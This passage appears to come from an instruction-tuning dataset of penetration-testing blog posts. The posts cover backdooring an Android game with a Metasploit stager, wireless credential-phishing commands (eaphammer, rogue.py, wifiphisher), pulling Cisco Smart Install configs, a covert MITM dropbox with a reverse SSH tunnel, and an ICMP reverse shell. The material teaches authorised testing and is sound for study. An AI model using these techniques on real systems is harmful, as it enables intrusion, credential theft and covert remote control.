a moment the final result after modification will look like the below screenshot Add Permissions to the Modified APK AndroidManifest.xml File For the next step use grep to search for all of the lines in the Metasploit AndroidManfest.xml file that contain the strings uses-permission and uses-feature into the modified APK's AndroidManiest.xml file You will need to use an editor to insert the permissions at the appropriate place in the new AndroidManifest.xml file Search for an existing use-permission line as your guideline of where to insert the text You might end up with some duplicate permissions You can optionally remove them but it really does not matter Build the New APK Package File Now use the apktool again to re-assemble the resulting APK package file The end result will be written into a dist directory within the APK directory itself Re-Sign the Resulting Package File For resigning one easy method is to use the Android debugging keystore which is built if you install Android studio The debugging keystore will be contained within the .android hidden directory in your home directory on a UN X system An alternative method is to use the Java keytool to generate your own self-signed keystore and sign it using the jarsigner tool as shown in the screenshots below At this point in time the final.apk file is ready to be loaded onto an Android system using adb In this specific case I am running a copy of GenyMotion which is an x86 based emulator that uses VirtualBox for a very high performing Android emulation One of the challenges you might immediately run into is that the x86 emulation will not natively support the ARM processor To get around this challenge there are some ARM translation libraries available online You would need to search for Genymotion-ARM-Translation_v1.1.zip and then drag the ZIP file onto a running GenyMotion Android system Unfortunately this is not 100 reliable and some app crashes may still result One certain way to make sure an ARM APK file runs on a device is to use a hardware device itself I have found that the Nexus 6 series of devices are nice to work with as the rooting kit is fairly reliable and attaching via a USB cable for testing is not too onerous The final step is of course to try out our newly infected Cowboy Shooting game We find out quickly that the moment we launch the game we get a Meterpreter shell on our KALI system which just feels so right I really don't think I am going to take the time to learn this game which frankly was just a random pick from apkmonk.com So Many Complicated Steps so much can go wrong So after performing all of the requisite steps above I was immediately frustrated There are so many moving parts that the chances of error are pretty high There are likely other tools out there that are available to use but I decided to whip up a quick Python script to automate this process I called it android_embedit.py and I will warn you now this is definitely a quick and dirty effort to get something to do the job without much effort on hardening the logic at all The idea of android_embedit.py is that if you supply a Metasploit generated APK file an original APK to modify and a keystore it will perform all of the steps in an automated fashion and generate the result for you Below is an example of running the tool All of the temporary files and output will be stored in the .ae directory The tool also will remove the metasploit directory name and obfuscate it with a random string directory name automatically You can see this result in the below screenshot in which I listed the contents of the APK smali com directory The directory named dbarpubw actually contains the Metasploit stager code There is much continuing fun to be had with mobile apps and their associated application programming interfaces It is a good idea to get familiar with the platforms as a pen tester as you will undoubtedly encounter a need to test in the mobile space before long I suppose you just might want to play with Android EmbedIT now Well if you do you can download from my GitHub by visiting ithub.com yoda66 AndroidEmbedIT Keep calm and hack all the mobile things Joff"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wireless Hack Packages Update</title>\n<taxonomies>Author, Jordan Drysdale, Phishing, Red Team, Wireless, brief how-to's, eaphammer, hacking, hostapd-wpe, Jordan Drysdale, Python, rogue.py, Wireless, wireless phishing</taxonomies>\n<creation_date>Thu, 18 Oct 2018 15:09:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale With Wild West Hackin Fest 2018 coming up here's a preview of some things you might see in the wireless labs First s0lst1c3's eaphammer relkci and I met this dude at HackWest 2018 doing his thing Full workshop his time and effort free for the public Brilliant kid couldn't have been nicer more willing to share or fully engaged with the community His package has been the first executed out of my backpack during onsite engagements for a while now Link ithub.com s0lst1c3 eaphammer Usage 5 minutes to online Git clone Generate cert Attack This is a solid tool that torques hostapd-wpe configs on the fly and steals creds This has an autocrack option so it can be very effective where situational user population password policies are not There are a lot more options and things to do with this tool than just steal RADIUS creds eaphammer --auth wpa --essid dot1x -i wlan0 --creds And as usual assuming the certificate is believable enough we have creds of sorts The InfamousSYN's Rogue.py link here ithub.com InfamousSYN rogue Usage 5 minutes to online Git clone Generate cert Attack I have been using this for the infamous --gag KARMA attack Python rogue.py -I wlan0 -H g -C 6 --auth open --internet --karma -w demo.pcap And voila...station connected Then my device requests the subnet gateway MAC address forward along a DNS request for twitter This could clearly be much more painful This utility has a mountain of configurable options ripe for further investigations Last up for today the wifiphisher kit Can be pulled from Github here ithub.com wifiphisher wifiphisher Usage 5 minutes to online Git clone Python setup.py install Generate cert Attack This one is a step up for sure The command line options are not for the faint of heart and some of the PHISHINGSCENARIOS don't quite align with each other's naming conventions I personally love the pop-up web server wireless key request Run it like so Wifiphisher -e DemoWPA2 -p wifi_connect -nE Open web browser and see this source is wifiphisher Github Entered data is POSTed to tool Game on Wireless hacking tools update complete Always be civil Cheers"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wild West Hackin' Fest 2018</title>\n<taxonomies>Fun & Games, Informational</taxonomies>\n<creation_date>Thu, 01 Nov 2018 19:22:16 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Bronwen Aker For those of you not fortunate enough to attend this year's Wild West Hackin Fest WWHF was phenomenal featuring speakers from diverse aspects of information security workshops labs and a killer CTF all taking place at the Deadwood Mountain Grand a Holiday Inn Resort Hotel Casino Spa and Event Center In spite of its name this year's WWHF addressed more than just hacking Given that Black Hills Information Security BHIS is best known for its penetration testing services it's no surprise that a lot of the talks dealt with pen testing tips tricks and traps But there were other talks including one on the importance of taking a break from all our electronic devices and another by a woman who used to be a stay-at-home-mom and who is now an infosec pro The fun and games started Wednesday evening with a Retro Gaming Room Old Timey Photos hardware hacking labs the Escape Room and several talks The party that evening was pretty fun too The official start of the conference was Thursday morning with the Escape Room opening up as well as the first of a couple Offensive WMI Windows Management Instrumentation workshops and the keynote by Ed Skoudis who is the Founder of Counter Hack Challenges a SANS Fellow and infosec wizard extraordinaire Ed Skoudis giving his keynote Ed's keynote titled The Top Ten Reasons It's GREAT To Be a Pen Tester And How You Can Help Fix that PROBLEM set a persistent tone for the conference He talked about the fun side of hacking and about how stunt hacking is useless as a business model Ultimately penetration testing needs to help support business and to empower organizations to improve their security This theme was carried later in the day by BB King in his talk Hack for Show Report for Dough Kevin Johnson Tarah Wheeler Other talks addressed a wide range of topics including undocumented features of Windows and how to exploit them tips on learning Python how to extract data from Slack Android app testing and much much more But the talks weren't the only cool thing at WWHF not by a long shot In addition to the hardware hacking labs and the Escape Room there were lots of fun things for folks who enjoy lock sport There was a Hall of Doors set up with all kinds of doors for people to hack including doors with simple pin locks less simple pin locks and electronic locks of various kinds There was even a Lock Picking Gun Fight Tournament run by Jonathan Ham and Deviant Ollam in which contestants had to pick locks in order get more ammo for their Nerf guns so they could shoot their opponent It was great fun And there were CTFs Really is it possible to have a hackers conference without at least one CTF The MetaCTF Team and WWHF put together the official conference CTF The CTF questions covered a wide range of infosec topics including encryption IoT web app vulnerabilities I can't remember them all And at the closing ceremony they rattled off some impressive statistics for the CTF covering everything from how many unique domains were in the emails used to register for the CTF to how many attempts were made to answer questions MetaCTF Crew MetaCTF 1st Place Winners Another CTF was set up by GRIMM Cyber R D Their Howdy Neighbor CTF was all about hacking IoT devices The dollhouse they has set up was fully wired furnished with 3D-printed furniture and even had a working mini-TV in the living room And let us not forget the DNS Scavenger Hunt by Active Countermeasures Their scavenger hunt required knowledge of DNS hexadecimal a bit about some local to Deadwood landmarks and a lot of creative thinking I could go on and on about the conference From start to finish it was an amazing wonderful empowering event with hackers from all kinds of backgrounds and at all different levels all coming together to have a great time and share what they know Yeah you can bet I'll be at WWHF 2019 Wild horses couldn't stop me B Met Deviant Ollam on the way to Wild West Hackin Fest This guest post was written by the lovely Bronwen Aker Follow her on twitter here BronwenAker Links and references Official Website ww.wildwesthackinfest.com WWHF 2018 Schedule whf18.sched.com Twitter Feed witter.com WWHackinFest"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Cisco Smart Installs and Why They're Not Informational</title>\n<taxonomies>Author, Blue Team, External/Internal, Finding, Jordan Drysdale, Red Team, BlueTeam, Cisco, External Pentest, internal pentest, Inventory, Jordan Drysdale, Nessus, RedTeam, SIET</taxonomies>\n<creation_date>Mon, 12 Nov 2018 19:44:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr Cisco Smart Install is awesome on by default ...for hackers not sysadmins So you Nessus too Criticals and highs are all that matter Right Until this beauty came along but wait .this isn't Critical or High Let's just ignore it What can we do with this thing Download config Upload config Execute commands How do we find it nmap -p4786 0.0.0.0 0 this is bad Probably don't do this So what Let's grab SIET ithub.com Sab0tag3d SIET and gather a config siet.py -i 10.0.0.1 -g And yeah you guessed it we managed to download a config file But so what the internet only has like 78 377 of these according to Shodan as of November 7th 2018 at 11AM PDT The 'service password-encryption configuration parameter isn't good enough Cisco type 7 passwords are reversible Cisco type 5 are Cisco MD5 crackable Certain other parameters may expose interesting details Attackers can upload their own config Maintain your inventory Know your networks One command to disable 'no vstack Reference for Smart Install Concepts ww.cisco.com c en us td docs switches lan smart_install configuration guide smart_install concepts.html Reference for why this is bad ools.cisco.com security center content CiscoSecurityAdvisory cisco-sa-20180409-smi"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Pentesting Dropbox on Steroids</title>\n<taxonomies>Author, Informational, Joff Thyer, Red Team, Dropbox, Man-in-the-Middle, MITM, penetration tester, pentest, pentesting dropbox</taxonomies>\n<creation_date>Tue, 20 Nov 2018 15:34:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Many of you have probably already looked at Beau Bullock's fine blog entry on a penetration testing dropbox Beau has some excellent guidance on how to build the base dropbox platform using different platforms In this case I selected the ODroid-C2 platform running KALI ARM edition and am going to extend upon that to add some important capabilities I suggest you read Beau's post here as the information I will write about builds upon that foundation In short Beau's fine work speaks of deploying an ad-hoc Access Point for attacker pen-tester communications however in some scenarios think multi-tenant multi-floor building such a deployment might not be reachable via 802.11 As a modified solution the two specific things I will address are as follows Adding two additional Ethernet NIC's to create a transparent bridging Man in the Middle MiTM capability Adding a Cellular modem for backchannel communications instead of 802.11 WiFi A transparent bridging Man in the Middle MiTM capability is very useful in a red teaming scenario As long as the dropbox deployed has a battery to power it a tester can enter an organization through whatever means available deploy the dropbox by connecting it between a server desktop system and the Ethernet wall jack and get out fast The idea is that once the dropbox is powered up it connects to the chosen cellular network performs a reverse SSH connection outbound to a couple of pen-tester controlled systems in order so the penetration tester can then use said system remotely It is additionally still very useful to have a wireless NIC connected to the system for wireless traffic interception purposes Configuring a Transparent Bridge My requirements for the transparent bridging were pretty basic The bridge solution must forward any ARP requests and Ethernet frames with 0x0800 IP Ethernet type in them The bridge must also be capable of forwarding frames of Ethernet type 0x888E which are Extensible Authentication Protocol over LAN EAPOL This is important so that the capture of non-MACSEC enabled 802.1X frames can occur With MACSEC deployed the Ethernet frames are encrypted between endpoint and Ethernet switch rendering a MiTM solution inoperable unless the MiTM solution participates in the MACSEC protocol itself I will not be addressing this aspect however MACSEC is not as often deployed anyway Once you have your KALI system up and running you should start by installing bridge-utils on the system This is done easily using apt-get from a root shell as follows apt-get update apt-get install bridge-utils This of course assumes you have your ODroid-C2 connected to the Internet via its own internal Ethernet interface I would then recommend you acquire two reliable USB Ethernet NIC's from your favorite vendor I strongly suggest you obtain a USB3 based NIC with 10 100 1000Mbps capability I used an IOCrest branded adapter which is listed on Amazon here ww.amazon.com SuperSpeed-Gigabit-Ethernet-Adapter-SY-ADA24040 dp B00NJF1IC2 With your system booted up you should now see three total NIC's which should be named eth0 eth1 and eth2 You can use the ip link command to confirm this What we need to do now is create a transparent bridge interface so that traffic can be bridged between eth1 and eth2 We need to then make sure that this bridge gets created whenever the system is booted up To do this manually we use the brctl command both creating and adding the Ethernet interfaces to the bridge interface We must make sure that spanning tree remains disabled in this process I suggest naming the bridge interface br0 for simplicity To create this bridge we do the following brctl addbr br0 brctl addif br0 eth1 brctl addif br0 eth2 And subsequently to check our work we can type this command brctl show bridge name bridge id STP enabled interfaces br0 8000.00e04c6800c1 no eth1 eth2 The next challenge to solve is how to get the cellular modem to dial back to the provider In my case I chose to use Ting which is a Mobile Virtual Network Operator MVNO that leverages Sprint's network The most important first step is to make sure that your cellular modem is properly registered with your provider Ting and other MVNO's make this a fairly easy process Configuring Your Cellular Modem Before going further there are a few software packages which you must have To ensure you have them perform the following steps apt-get update apt-get install ppp wvdial usb-modeswitch One thing that is very important is to acquire a cellular modem that is not locked to any provider and is compatible with your chosen provider In my case I chose a GSM modem that is compatible with any GSM provider The Amazon link for acquiring is ww.amazon.com gp product B0769Z7WVQ The UNIX Linux tool you need to get the modem working is called wvdial n.wikipedia.org wiki WvDial which is a Point-To-Point PPP protocol dialer Believe it or not cellular modems still use that old AT command set syntax that you might remember from the days of using dialup modems The dialup initialization command set and other parameters will vary depending on your provider In my case the etc wvdial.conf file is listed below Dialer ting Init3 AT CGDCONT 1 IP wholesale Phone 99 IDSN 0 Baud 460800 Modem Type Analog Modem Stupid Mode 1 Username blank Modem dev ttyUSB0 Password blank Init1 ATZ Init2 ATQ0 V1 E1 S0 0 C1 D2 Idle 0 Dial Attempts 0 Dial Timeout 10 Contents of etc wvdial.conf The other challenge you must solve with cellular modems is that they typically have two modes One mode will mount the modem as a USB drive typically for installing software while the other mode will have the modem recognized as a modem thus yielding access to dev ttyUSB0 If you don't switch modes properly then you cannot access the modem The contents of etc usb_modeswitch.conf dictate how this occurs You should search around the Internet for the correct MessageContent parameter if you choose a different modem than listed in this article The DefaultVendor and DefaultProduct can be ascertained using the lsusb command if the modem is connected DisableSwitching 0 EnableLogging 0 DefaultVendor 0x12d1 DefaultProduct 0x1506 MessageEndPoint 0x01 MessageContent 55534243000000000000000000000011060000000000000000000000000000 Contents of etc usb_modeswitch.conf You should not need to worry about manually running usb_modeswitch since the udev daemon will take care of it If any concerns you check to see whether this entry in the file lib udev rules.d 40-usb_modeswitch.rules exists You can also search for usb_modeswitch in your var log syslog after plugging in the modem to confirm Now that you have these items in place you can attach a keyboard and monitor and test from the console It is important to ensure that wvdial is working correctly to dial up your cellular provider Assuming all things are correct you should see output that looks like the below screenshot upon success The command to dial with the above configuration named Ting is as follows wvdial ting Assuming you have this all working correctly I suggest creating a file in etc init.d that will start up your wvdial automatically when your system boots My startup script looks like this bin bash BEGIN INIT INFO Provides wvdial Required-Start network remote_fs syslog Required-Stop network remote_fs syslog Default-Start 3 Default-Stop Short-Description Start Reverse SSH END INIT INFO lib lsb init-functions case 1 in start if -e dev ttyUSB0 then now date Y m d H M S echo var log wvdial.log echo var log wvdial.log echo Script start time now var log wvdial.log echo var log wvdial.log wvdial ting var log wvdial.log 2 1 log_action_msg cellular modem link dialed else log_failure_msg failed to find cellular modem device fi stop pkill -f wvdial esac Reverse SSH Tunneling Now that you have a functioning cellular modem channel the next step is to establish a reverse SSH tunnel to your favorite Internet destination This will enable you to SSH to your dropbox via the reverse tunnel whenever you would like The easiest way to do this is to generate an SSH key on your dropbox system and then copy the public key over to an SSH authorized_keys file on the Internet destination system You also need to ensure that you have some redundancy idle timeout checking and that the SSH tunnels are established as soon as the system boots up For a reverse SSH tunnel the following arguments to SSH are useful -N do not execute a remote command -f request SSH to go into the background -T do not allocate a pseudo-terminal -R forward connections from remote side to local side of connection -o TCPKeepAlive yes enable TCP keep alive packets usually a default To generate and use the key I would recommend elliptical curve cryptography cipher since its a little easier on CPU consumption overall On the dropbox system generate your new private public key Then copy the .ssh id_ecdsa.pub text into the .ssh authorized_keys file on the Internet-connected host you want your dropbox to connect back to This is no different than any other trusted key SSH configuration If we assume the Internet address of the system you are going to connect back to is 255.99.99.99 then the SSH command you want to use to establish the tunnel is as follows root kali-arm64 ssh root 255.99.99.99 -o TCPKeepAlive yes -NTfR 2222 localhost 22 This means that we connect to the remote IP address and we ask the remote system to bind TCP port 2222 on the 127.0.0.1 localhost interface which we will subsequently use to SSH back into our dropbox On our remote system whenever we want to login to the dropbox we do the following 255.99.99.99 ssh -p 2222 root localhost More than likely you will want to exchange a public key from that remote system back to your dropbox also so that you have bi-directional trust for the root accounts This simply makes things easy and quick when connecting back to your system For redundancy on the SSH tunnels you can choose to implement both multiple IP address destinations and possibly multiple TCP ports You also will want the reverse SSH tunnels to be automatically established as soon as the Cellular Modem connection completes successfully I found that the best way to do this was to write a small script and place it into the etc ppp ip-up.d directory which will get executed as soon as the PPP daemon runs successfully Finally on the server side 255.99.99.99 remote end it is very helpful to set a couple of idle timeout parameters The reason for this is that if your dropbox is rebooted we really need the tunneled ssh sessions to timeout in order to free up the TCP ports we are binding If we don't do this we get hung SSH daemon sessions and subsequent SSH tunnels will fail My solution for this was to modify the etc ssh sshd_config file on the remote server end so that the ClientAliveInterval and ClientAliveMax options are appropriately set to timeout a connection after 3 retries of 5-second intervals A screenshot of my modifications is below sshd_config on the remote Internet Host Additional Packet Filtering and Forwarding At this stage we have a system that has a configured transparent bridge interface called br0 that will happily forward traffic across it and also that will SSH tunnel back home for you to enjoy This is an awesome achievement however there are a couple of issues that you must still take care of I would summarize these issues as follows The dropbox needs to be truly silent on the network That means on our eth1 and eth2 network interfaces we cannot issue any packets at all The dropbox needs to be able to forward Extensible Authentication Protocol over LAN EAPOL packets Unfortunately the Linux transparent bridging kernel code does not do this by default The default behavior for remaining silent needs to be configured at boot time The bridge interface needs to be properly configured at boot time I usually make the assumption that my eth2 port is going to be the port that faces the network switch and I label things accordingly This is helpful when using the system although always keep in mind that eth1 and eth2 are all bridged directly to the br0 interface One other behavior we need to be aware of is layer 2 layer 3 Multicast traffic It a system is going to try and issue a multicast packet to a destination address in the 224.0.0.0 4 range that packet will get an automatic mapping to layer 2 and a Multicast Ethernet frame will be issued to an address in the 01 xx xx xx xx xx address space ie a frame with the Multicast bit set Using the principle of staying silent we need to squelch not only potential Multicast but also any potential ARP traffic To start with install the additional filtering tools on the dropbox which are both arptables and ebtables This gives you the ability to filter packets at layer 2 and filter ARP traffic apt-get update apt-get install arptables apt-get install ebtables After doing this and performing some considerable experimentation I came up with a configuration which I placed completely into the etc network interfaces file to perform all of the tasks I needed which are Configuration of eth0 eth1 and eth2 Configuration of the bridge interface br0 Putting a link scope local address on the bridge interface Filtering ARP traffic egress on the eth2 port Filtering IP traffic egress from the eth2 port Filtering any Multicast Ethernet traffic Enabling EAPOL traffic to be forwarded The configuration is included here for you to use also auto lo iface lo inet loopback auto eth0 allow-hotplug eth0 iface eth0 inet dhcp auto eth1 eth2 allow-hotplug eth1 eth2 auto br0 allow-hotplug br0 iface br0 inet static address 169.254.1.1 network 169.254.1.0 netmask 255.255.255.0 bridge_ports eth1 eth2 pre-up arptables -A OUTPUT -j DROP pre-up iptables -A OUTPUT -o br0 -j DROP pre-up ebtables -A OUTPUT -o br0 -d Multicast -j DROP post-up echo 8 sys class net br0 bridge group_fwd_mask Some Words on Lack of Power Budget It is probably no surprise to many of you that power is often oversubscribed on a USB bus The standard USB port can deliver 500 milliwatts by specification unless USB 3.0 which can deliver up to 900 milliwatts Well let's just consider a moment that you add two Ethernet NIC's and a Cellular Modem to the USB bus You are probably ok on a per-port basis but overall wattage draw will increase The other thing to consider is that we need portability for our dropbox solution meaning that you will need to power this thing with a battery Because I am completely obsessive I decided to perform an experiment Using a watt meter I plugged the dropbox fully configured into a USB charger The combination of the ODroid-C2 two USB NIC's and the cellular modem used a total of 4.7 Watts 4700 milliwatts Subtract the cellular modem and it dropped to 3000 milliwatts Subtract both NIC's and it dropped to 2700 milliwatts So our attached devices use up to 2000 milliwatts alone and the ODroid is using the remaining 2700 milliwatts And I am just guessing that you will want to add an 802.11 NIC to this thing also If you do then you had better account for another 300 900 milliwatts at a best guess Cellular Modem 1700 milliwatts USB NIC 150 milliwatts x 2 Using a little bit of mathematics we get 1 AMP x 5 VDC power supply is able to deliver a maximum of 5000 milliwatts Physics says P watts Volts x Amps My measurements are taken at an idle state which implies that we are very close to maximum power budget The answer is to please make sure your battery solution used is able to supply a minimum of 2 Amps which would be up to a maximum of 10 000 milliwatts Even when I have used a 2 Amp battery supply I have seen problems with the cellular modem if the battery is not fully charged If you don't follow this advice Well I suspect your USB devices will have a power deficit and start to act very strangely and this would be sub-optimal Go forth and Man-In-The-Middle all the things"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To: C2 Over ICMP</title>\n<taxonomies>C2, How-To, Red Team, C2, C2 over ICMP, command and control, ICMP, Internet Control Message Protocol, Red Team</taxonomies>\n<creation_date>Fri, 30 Nov 2018 15:32:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts In previous blogs I have shown how to get various C2 sessions In this blog I will be showing how to do C2 over ICMP First what is ICMP ICMP is Internet Control Message Protocol It allows internet-connected devices to send error messages back to the source IP address when problems in delivering packets have been encountered It sounds like a very useful protocol which it is But it can be very useful for attackers as well It seems that almost everything that can be used for good can and is used for bad ICMP is no different In order to set up our session we need to download a couple of files The first file is going to be run on the attacking machine You can download it here ithub.com inquisb icmpsh I just did a clone of it on my Kali machine The second file is a PowerShell script which we will run on the victim You can download the script here ithub.com samratashok nishang blob master Shells Invoke-PowerShellIcmp.ps1 On my attacking machine instance I cloned icmpsh In order to get my ICMP C2 to work I had to disable machine-based ICMP I was able to do this by using the following command I then ran the python script to start up my listener As you can see in order for the script to run we need to give it our source IP and destination IP As you can see nothing happened This is because our client hasn't been set up yet Go to the GitHub repo mentioned above and save the raw code Now that we have the PowerShell code we need to transfer this to the victim computer Of course there is a myriad of ways this can be done I won't go into details on how to do this in practice and since this is just a trial I just copied it over Now that I have my script ready I will run it This is a PowerShell script so I need to get a PowerShell command prompt Now that we have a PowerShell prompt I need to run my script I will navigate to where I put the file and run the following commands I am then asked to put in the IP address for the listener that I set up When I run the command the script runs and my listener that I had started on my Kali connects It is almost like magic You can see at the bottom of the screenshot that I have my PowerShell command prompt from my Windows machine Now I can run any commands as if I were on the victim's computer So what is the benefit of using ICMP as the method for the C2 All of the communication is injected into ICMP packets both the request and the response Because all of the traffic is in ICMP packets the traffic is undetected by proxy-based firewalls This isn't to say that these connections can't be detected but they can bypass some firewall rules"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Social Engineering in Japan</title>\n<taxonomies>Fun & Games, Informational, Social Engineering, general infosec, informational, social engineering</taxonomies>\n<creation_date>Wed, 02 Jan 2019 15:28:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kelsey Bellew It's an occupational hazard to see vulnerabilities everywhere When I see a router sitting in plain sight I think The default creds are probably printed on the back I wonder if those were ever changed When I see an unattended locked door propped open by a shoe or a box it's Why would they just leave it like that Should I go close it Do they not have a key When I see a friend or family member who doesn't even have a pattern lock set up on their phone I start preaching horrified about how they're doing it wrong Seriously Aunt Laurie please lock your phone Please For me The story below illustrates one of these situations where every step of the way I was thinking I shouldn't be allowed to do this Why are you letting me do this Why aren't you stopping me The purpose of publishing this story is to highlight what went right what went wrong and what could have been done better in hopes that its readers will reflect and apply insights gained to their own situations Accidental Social Engineering This month my friend had surgery in a hospital in Japan They wouldn't release her unless she had someone to take her home so I volunteered She assured me it was an international hospital and I could just ask for her at the reception desk using English The hospital was in an area I'd never been to before I got lost on the way and my friend wasn't answering her phone I found the building I thought she was in tried calling once more and then walked inside The building seemed a lot more closed off than hospitals in America and I was immediately wary There was only one entrance and I had to talk with a security guard in order to enter I walked up to the security guard posted at what seemed to be the reception desk and his deer-in-the-headlights expression told me he was not a man well accustomed to receiving foreign-looking visitors I used my broken Japanese to try to convey that I was here to wait for my friend's surgery and eventually got the point across He asked for her name but he couldn't find it in his system He asked for her room number but I didn't know what it was I said Maybe the 9th floor He had me fill out a slip of paper with my name arrival time and allowed me to leave the destination field blank on the form I entered the elevator alone and hit the button for the 9th floor Only one nurse was present and she went out of her way to pretend she hadn't seen me I approached her and she looked at me with the typical panicked Japanese stare of I took some English in high school and I don't remember any of it I told her in disjointed Japanese that I was looking for my friend who was staying at this hospital This is the exercise rehabilitation floor there are no patients here What did reception say the nurse said I asked reception but trailing off is a classic way to let other people draw conclusions and that way you only have to remember half as many words Well you really need a badge She gestured at what looked like an RFID access card Your friend is probably on the 8th floor but you really need to go get a badge from the 1st floor I thanked her and went back to the elevator I closed the elevator door and considered my next move Going back down to talk with the reception desk guy sounded painful I hit the button for floor 8 Floor 8 had badge readers I looked at them for a moment thinking This is it you've gone too far Tailgating is probably illegal here let's just go home Then a nurse noticed I looked lost and opened the door for me _ \u30c4 _ View From the 8th Floor of the Hospital I Shouldn't Be At This is indicative of situations that we encounter often on physical engagements We often don't need to go for the mission impossible style tasks like picking locks cloning ID cards or bypassing security systems By simply allowing employees to draw their own conclusions we can be allowed entry into restricted areas People being too polite or helpful can be incredibly harmful when it comes to physical security A review of what was done right and wrong in this situation The Good This did not seem like the kind of hospital that expected any kind of visitors and at the start they seemed to have the right kind of fail-safes Entering through the only obvious entrance to the building required visitors to interact with the security guard at reception Required to know who you were visiting and what floor they were on Required to sign in at the front desk Unable to enter high risk floors without a badge Employees knowing that badges were distributed at reception and initially not using their own badge to get me where I wanted to go The Bad On the other hand I was allowed to sign by scribbling some unintelligible Japanese on a sticky note I was not required to produce any ID I was allowed to enter without having a clear destination There were no controls on the elevator preventing me from navigating to restricted floors When entering restricted areas employees ignored me or opened locked doors for me What could have been done better Despite all of these controls I was able to enter a locked area of the building by just walking around and looking confused What could have stopped me from getting as far as I did A few closing thoughts from someone who has admittedly never worked in healthcare Reception could have sent a coworker to ask around about the existence of my friend Reception could have tried harder to find my friend in their system instead of giving up when he didn't know how to spell it My name could have been somewhere in their system my friend informed me the hospital needed her to provide an emergency contact If my name wasn't in the system I shouldn't have been allowed past reception The nurse on floor 9 could have escorted me down to the reception desk on the first floor The nurse on floor 9 could have called reception to make sure they knew I was in the building The nurse on floor 8 could have asked me to get a badge from reception instead of letting me in through the locked area Or could have found someone to escort me downstairs P.S I found my friend on floor 8 For anyone who's ever been a physical pentester these things often cross our minds We see the world in a slightly different way no matter how ordinary these things seem to others"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Healthy Hacking with the Treadmill Elliptical Desk: My journey to staying healthy while hacking!</title>\n<taxonomies>How-To, Informational, Healthy, Healthy Hacking, Tips and Tricks, Treadmill</taxonomies>\n<creation_date>Thu, 06 Dec 2018 19:46:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts I'm a red teamer I love my job but I spend way too much time at a desk in front of a computer This year I wanted to find a way to continue spending a lot of time at the computer without letting my physical health decline This article will describe my journey to a solution that I love It involves a combination of a treadmill desk and an under desk elliptical machine with some extra magic thrown in The result is an awesome setup that allows me to stay fit while doing what I love legally hacking computers and networks The Treadmill My first thought was to get a treadmill desk I knew that I wouldn't be up for walking all day but I wanted to be able to walk at least 4 miles a day while still working I looked into desks that could adjust to both standing and sitting positions but I didn't like any of them They were too small to accommodate all the screens and hardware I wanted on my desk I ended up building my own fixed desk at standing height You'll see my efforts at solving the sitting problem later I already had a treadmill so I just cut the arms off of it and mounted the control center to the side of the desk I can very comfortably walk at the 1.5 mph setting while typing and moving the mouse precisely I can push that up to 2 mph if I'm willing to be a little wiggly with my mouse control Of course if you have meetings where you aren't trying to type you can go normal walking speeds and really rack up 